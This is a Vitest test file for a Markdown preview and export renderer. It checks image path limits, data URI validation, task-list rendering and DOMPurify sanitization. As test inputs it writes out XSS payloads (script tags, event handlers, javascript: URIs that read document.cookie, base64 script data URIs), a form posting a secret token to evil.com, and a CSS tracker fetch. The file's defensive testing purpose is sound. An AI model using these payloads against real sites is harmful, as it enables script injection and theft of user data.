import { describe, expect, it } from "vitest";
import { inlineWorkspaceAssetImages, renderMarkdown } from "./markdown";

describe("renderMarkdown image policy", () => {
  it("allows README-relative workspace images outside assets", () => {
    const html = renderMarkdown("![shot](docs/images/shot.png)", {
      documentPath: "/ws/README.md",
      workspaceRoot: "/ws",
    });

    expect(html).toContain('data-hazakura-image-path="/ws/docs/images/shot.png"');
    expect(html).not.toContain("画像を表示できません");
  });

  it("keeps existing assets image references allowed", () => {
    const html = renderMarkdown("![asset](assets/pic.png)", {
      documentPath: "/ws/README.md",
      workspaceRoot: "/ws",
    });

    expect(html).toContain('data-hazakura-image-path="/ws/assets/pic.png"');
    expect(html).not.toContain("画像を表示できません");
  });

  it("allows README raw HTML image tags inside the workspace", () => {
    const html = renderMarkdown(
      '<img src="src/assets/hazakura-mark.png" alt="logo" width="128">',
      {
        documentPath: "/ws/README.md",
        workspaceRoot: "/ws",
      },
    );

    expect(html).toContain(
      'data-hazakura-image-path="/ws/src/assets/hazakura-mark.png"',
    );
    expect(html).toContain('alt="logo"');
    expect(html).not.toContain("画像を表示できません");
  });

  it("inlines workspace image placeholders through the preview loader", async () => {
    const html = renderMarkdown("![shot](docs/images/shot.png)", {
      documentPath: "/ws/README.md",
      workspaceRoot: "/ws",
    });

    const inlined = await inlineWorkspaceAssetImages(html, async (path) => {
      expect(path).toBe("/ws/docs/images/shot.png");
      return "data:image/png;base64,iVBORw0KGgo=";
    });

    expect(inlined).toContain('src="data:image/png;base64,iVBORw0KGgo="');
    expect(inlined).not.toContain("data-hazakura-image-path");
  });

  it("resolves nested document-relative images inside the workspace", () => {
    const html = renderMarkdown("![figure](../docs/images/figure%201.png)", {
      documentPath: "/ws/notes/today.md",
      workspaceRoot: "/ws",
    });

    expect(html).toContain('data-hazakura-image-path="/ws/docs/images/figure 1.png"');
    expect(html).not.toContain("画像を表示できません");
  });

  it("blocks relative images that escape the workspace", () => {
    const html = renderMarkdown("![secret](../outside.png)", {
      documentPath: "/ws/README.md",
      workspaceRoot: "/ws",
    });

    expect(html).toContain("画像を表示できません: secret");
    expect(html).not.toContain("data-hazakura-image-path");
  });

  it("continues to block external images", () => {
    const html = renderMarkdown("![remote](https://example.com/shot.png)", {
      documentPath: "/ws/README.md",
      workspaceRoot: "/ws",
    });

    expect(html).toContain("画像を表示できません: remote");
    expect(html).not.toContain("https://example.com/shot.png");
  });

  // v0.17 app-store-quality: markdown-preview-export-security
  // slice 2.2 — data:image URI validation. The
  // `isAllowedEmbeddedImageSource` regex restricts
  // embedded images to four known image formats (png,
  // jpeg, gif, webp) with a well-formed base64 payload.
  // Any data URI outside that narrow envelope is treated
  // as an external image and replaced by a "blocked"
  // placeholder — no `<img>` node with the raw URI
  // survives in the output. An oversized guard
  // (data:image > 2 MB) is deferred to slice 2.3; the
  // regex currently accepts arbitrarily large payloads.

  it("blocks data:image/svg+xml URIs", () => {
    const html = renderMarkdown(
      "![svg](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)",
    );

    expect(html).toContain("画像を表示できません");
    expect(html).not.toContain("data:image/svg+xml");
  });

  it("blocks non-image data URIs as img sources", () => {
    const html = renderMarkdown(
      "![html](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    );

    expect(html).toContain("画像を表示できません");
    expect(html).not.toContain("data:text/html");
  });

  it("blocks data:image URIs with invalid base64 payloads", () => {
    // The `;base64,` prefix is required, and the
    // payload must only contain [A-Za-z0-9+/=\s].
    // Semicolons and other characters break the
    // encoding and must not fall through.
    const html = renderMarkdown(
      '![bad](data:image/png;base64,iVBORw0KGgo=;alert(1))',
    );

    expect(html).toContain("画像を表示できません");
    expect(html).not.toContain("alert(1)");
  });

  // v0.17 slice 2.3 — cap embedded data:image URIs at 2 MB.
  // A payload larger than this would produce a sluggish
  // preview parse and a multi-megabyte export file.

  it("blocks oversized data:image URIs", () => {
    // 2 MB + 1 byte of base64-like payload pushes the
    // URI length past MAX_EMBEDDED_IMAGE_BYTES, so
    // `isAllowedEmbeddedImageSource` returns false
    // before the regex even runs. The image policy then
    // treats it as an external image → blocked message.
    const payload = "A".repeat(2 * 1024 * 1024 + 1);
    const oversized = `![big](data:image/png;base64,${payload})`;

    const html = renderMarkdown(oversized);

    expect(html).toContain("画像を表示できません");
    expect(html).not.toContain("data:image/png");
  });

  it("continues to allow small valid data:image/png URIs", () => {
    const html = renderMarkdown(
      "![icon](data:image/png;base64,iVBORw0KGgo=)",
    );

    expect(html).not.toContain("画像を表示できません");
    expect(html).toContain("data:image/png;base64,iVBORw0KGgo=");
  });
});

describe("renderMarkdown task list preview", () => {
  it("renders GFM task list markers as inert preview checkboxes", () => {
    const html = renderMarkdown("- [ ] todo\n- [x] done");
    const template = document.createElement("template");
    template.innerHTML = html;
    const checkboxes = Array.from(
      template.content.querySelectorAll<HTMLElement>(".markdown-task-checkbox"),
    );

    expect(checkboxes).toHaveLength(2);
    expect(checkboxes[0]?.closest("li")?.classList).toContain(
      "markdown-task-list-item",
    );
    expect(checkboxes[1]?.closest("li")?.classList).toContain(
      "markdown-task-list-item",
    );
    expect(checkboxes[0]?.getAttribute("role")).toBe("checkbox");
    expect(checkboxes[0]?.getAttribute("aria-checked")).toBe("false");
    expect(checkboxes[0]?.getAttribute("aria-disabled")).toBe("true");
    expect(checkboxes[0]?.textContent).toBe("☐");
    expect(checkboxes[1]?.getAttribute("role")).toBe("checkbox");
    expect(checkboxes[1]?.getAttribute("aria-checked")).toBe("true");
    expect(checkboxes[1]?.getAttribute("aria-disabled")).toBe("true");
    expect(checkboxes[1]?.textContent).toBe("☑");
    expect(html).toContain("todo");
    expect(html).toContain("done");
    expect(html).not.toContain("<input");
    expect(html).not.toContain("[ ]");
    expect(html).not.toContain("[x]");
  });

  it("does not mutate Markdown source when rendering task lists", () => {
    const source = "- [ ] todo\n- [x] done";
    const snapshot = source.slice();

    renderMarkdown(source);

    expect(source).toBe(snapshot);
  });
});

// v0.17 app-store-quality: markdown-preview-export-security slice 2.1
// — script execution vectors in Markdown preview and HTML export.
// Both preview and export share the same `renderMarkdown` pipeline
// (marked → image/table policy → DOMPurify.sanitize), so a single
// test surface covers both. The tests below pin three script-
// execution vectors: inline `<script>` tags, event-handler
// attributes on raw-HTML elements, and `javascript:` URIs in
// Markdown link/image targets. The final test asserts that
// `renderMarkdown` never mutates the source string — the
// Markdown source is canonical, and sanitization happens only
// in the rendered tree.
//
// DOMPurify with `USE_PROFILES: { html: true }` already rejects
// all event handlers and dangerous tags by default; the explicit
// `FORBID_TAGS` / `FORBID_ATTR` lists in the config are defense-
// in-depth. The `ALLOWED_URI_REGEXP` rejects any URI scheme that
// is not http/https/mailto/tel/etc., including `javascript:`.

describe("renderMarkdown sanitization", () => {
  it("strips inline script tags from Markdown raw HTML", () => {
    const html = renderMarkdown('<script>alert("xss")</script>\n\nHello');

    expect(html).not.toContain("<script");
    expect(html).not.toContain("alert");
    // Non-script content must pass through.
    expect(html).toContain("Hello");
  });

  it("strips event-handler attributes from inline HTML elements", () => {
    // Use `<span>` rather than `<img>` so the assertion
    // is against DOMPurify's attribute removal, not a
    // side effect of `applyImagePreviewPolicyToFragment` replacing
    // the image node before DOMPurify runs. A `<span>`
    // survives both the image and table policies, so any
    // disappearance of `onclick` / `onmouseover` is
    // solely DOMPurify's work.
    const html = renderMarkdown(
      '<span onclick="alert(1)" onmouseover="boom()">keep</span>',
    );

    expect(html).not.toContain("onclick");
    expect(html).not.toContain("onmouseover");
    expect(html).not.toContain("alert(1)");
    expect(html).not.toContain("boom()");
    // The element and its text content must survive —
    // only the dangerous attributes are stripped.
    expect(html).toContain("<span");
    expect(html).toContain("keep");
  });

  it("removes javascript: URLs from Markdown link targets", () => {
    const html = renderMarkdown("[click me](javascript:alert(1))");

    expect(html).not.toContain("javascript:");
    // The link text must survive; only the dangerous href
    // is removed.
    expect(html).toContain("click me");
  });

  it("removes javascript: URLs from Markdown image sources", () => {
    const html = renderMarkdown(
      "![xss](javascript:alert(document.cookie))",
    );

    expect(html).not.toContain("javascript:");
    // The alt text should remain as the blocked-image
    // message or a replacement node — not as a passive
    // `<img src="...">`.
    expect(html).not.toContain('<img src="javascript');
  });

  it("does not mutate the source Markdown string", () => {
    const source = '<script>alert("xss")</script>\n\nHello';
    const snapshot = source.slice();

    renderMarkdown(source);

    expect(source).toBe(snapshot);
  });

  // v0.17 app-store-quality: slice 2.3 — remaining
  // DOMPurify coverage. `FORBID_TAGS` now covers
  // `<style>` (CSS url() external fetch path),
  // `<form>`/`<input>`/`<button>` (off-site submit
  // targets in export), and `<object>`/`<embed>`/
  // `<iframe>` (multi-media script containers).
  // The `ALLOWED_URI_REGEXP` rejects `data:` in `href`,
  // leaving a bare `<a>` with the link text intact.

  it("strips object, embed, and iframe tags from raw HTML", () => {
    const html = renderMarkdown(
      '<object data="evil.swf"></object>\n' +
        '<embed src="evil.swf">\n' +
        '<iframe src="https://evil.com"></iframe>\n' +
        '<p>safe</p>',
    );

    expect(html).not.toContain("<object");
    expect(html).not.toContain("<embed");
    expect(html).not.toContain("<iframe");
    expect(html).toContain("safe");
  });

  it("removes data: URIs from anchor href attributes", () => {
    // The ALLOWED_URI_REGEXP rejects any scheme not in
    // the known-safe list (http, https, mailto, etc.).
    // `data:text/html` falls through every alternative
    // → the href is removed, leaving a bare `<a>`
    // element with the link text intact.
    const html = renderMarkdown(
      '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
    );

    expect(html).not.toContain("data:text/html");
    expect(html).toContain("click");
  });

  it("strips form elements and their interaction controls", () => {
    // `<form>`, `<input>`, `<button>`, `<textarea>`,
    // `<select>`, and `<option>` are all listed in
    // `FORBID_TAGS`. They are not script vectors, but
    // their `action` / `formaction` attributes can
    // point to an off-site submit target in exported
    // HTML — a fetch/submit path the Safe Editor must
    // not create. Stripping the tags entirely also
    // keeps the exported HTML trivially free of any
    // form-borne data-exfiltration vector.
    const html = renderMarkdown(
      '<form action="https://evil.com/steal">' +
        '<input name="token" value="secret">' +
        '<button type="submit">send</button>' +
        '</form>\n' +
        '<textarea>draft</textarea>\n' +
        '<select><option>pick</option></select>',
    );

    // All forbidden tags must be absent from the output.
    expect(html).not.toContain("<form");
    expect(html).not.toContain("<input");
    expect(html).not.toContain("<button");
    expect(html).not.toContain("<textarea");
    expect(html).not.toContain("<select");
    expect(html).not.toContain("<option");
    // Neither the submit target nor the form values
    // must survive anywhere in the DOM.
    expect(html).not.toContain("https://evil.com");
    expect(html).not.toContain("secret");
  });

  it("strips style tags that could carry CSS url() external fetches", () => {
    // DOMPurify's HTML profile does not sanitise CSS
    // content inside a `<style>` block, so
    // `url(https://...)` references survive the default
    // pass. Adding `style` to `FORBID_TAGS` removes the
    // entire block, which also removes any
    // `@import` / `url()` / `@font-face` loading paths
    // the CSS might have carried.
    const html = renderMarkdown(
      '<style>\n' +
        '  body { background: url("https://tracker.example.com/px.gif"); }\n' +
        '</style>\n' +
        '<p>visible text</p>',
    );

    expect(html).not.toContain("<style");
    expect(html).not.toContain("url(");
    expect(html).not.toContain("tracker.example.com");
    // Non-forbidden content must pass through.
    expect(html).toContain("visible text");
  });
});
